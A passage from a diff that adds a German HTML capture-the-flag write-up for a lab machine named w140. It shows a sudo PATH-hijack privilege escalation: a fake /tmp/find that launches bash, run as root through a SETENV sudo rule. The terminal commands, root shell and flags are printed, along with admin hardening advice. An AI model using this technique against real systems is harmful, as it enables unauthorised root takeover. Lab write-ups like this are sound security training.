+                 2.  **Exploit ausführen:** Der `sudo`-Befehl wird ausgeführt, aber die `PATH`-Variable wird manipuliert, sodass `/tmp` an erster Stelle steht (`PATH=/tmp:$PATH`). Wenn das Skript `/opt/Benz-w140` nun `find` aufruft, findet die Shell das bösartige Skript `/tmp/find` zuerst und führt es als `root` aus.
+                 3.  **Root-Shell erhalten:** Das Skript `/tmp/find` führt `/bin/bash` aus, was dem Angreifer eine Root-Shell gibt.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Exploit ist erfolgreich. Die Manipulation der `PATH`-Variable in Verbindung mit der `SETENV`-Option in `sudo` und dem relativen Pfad im Skript ermöglicht die Ausführung des bösartigen `/tmp/find`-Skripts als `root`. Der Prompt wechselt zu `root@w140:/tmp#`. Fantastisch, Root-Zugriff erreicht!
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Root-Zugriff erlangt. Bestätigen Sie mit `id`. Suchen und lesen Sie die Root-Flag.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Korrigieren Sie die `sudo`-Regel (entfernen Sie `SETENV`, `NOPASSWD` und `*`, wenn möglich). Verwenden Sie absolute Pfade in allen Skripten, die über `sudo` oder als `root` ausgeführt werden.
+             </p>
+              <p class="evaluation">
+                  <strong>Risikobewertung:</strong> Die Kombination aus einem unsicheren File-Upload (RCE), einem versteckten QR-Code mit Passwort und einer unsicheren `sudo`-Konfiguration ermöglichte die vollständige Systemübernahme. Das Risiko ist **kritisch**.
+              </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Als Benutzer ghost -->
+                      <div class="prompt no-kali-prompt">ghost@w140:~$ <span class="command">cd /tmp/</span></div>
+                      <div class="prompt no-kali-prompt">ghost@w140:/tmp$ <span class="command">echo '/bin/bash' > find</span></div>
+                      <div class="prompt no-kali-prompt">ghost@w140:/tmp$ <span class="command">chmod +x find</span></div>
+                      <div class="prompt no-kali-prompt">ghost@w140:/tmp$ <span class="command">ls -la</span></div>
+                      <pre>
+total 12
+drwxrwxrwt  9 root  root  4096 Apr  4 10:43 .
+drwxr-xr-x 18 root  root  4096 Jan 29 14:49 ..
+-rwxrwxrwx  1 ghost ghost   10 Apr  4 10:43 find # Bösartiges Skript
+drwxrwxrwt  2 root  root  4096 Apr  4 08:23 .font-unix
+# ... (weitere tmp Dateien) ...
+                      </pre>
+                      <div class="prompt no-kali-prompt">ghost@w140:/tmp$ <span class="command">echo $PATH</span></div>
+                      <pre>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</pre>
+                      <div class="prompt no-kali-prompt">ghost@w140:/tmp$ <span class="command">sudo PATH=/tmp:$PATH /opt/Benz-w140</span></div>
+                      <!-- Das Skript ruft 'find' auf, was /tmp/find ausführt -->
+                      <div class="prompt root-prompt">root@w140:/tmp# </div> <!-- Root-Shell! -->
+                  </div>
+              </div>
+               <!-- Root Flag lesen -->
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt root-prompt">root@w140:/tmp# <span class="command">cd ~</span></div>
+                       <div class="prompt root-prompt">root@w140:~# <span class="command">ls</span></div>
+                       <pre>root.txt</pre>
+                       <div class="prompt root-prompt">root@w140:~# <span class="command">cat root.txt</span></div>
+                       <pre><span class="password">2f9f7d1b4a6ae9d6bbbaf6298c5dcc25</span></pre>
+                   </div>
+               </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Die User-Flag wurde im Home-Verzeichnis von `ghost` gefunden. Die Root-Flag wurde im Home-Verzeichnis von `root` gefunden, nachdem Root-Rechte erlangt wurden.
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Beide Flags wurden erfolgreich extrahiert.
+                 </p>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/ghost/user.txt</div>
+                     <div class="flag-value"><span class="password">61f1157a5b8f5a4b6729367098fcb2a4</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">2f9f7d1b4a6ae9d6bbbaf6298c5dcc25</span></div>
+                 </div>
+             </div>
+         </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-04</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>  
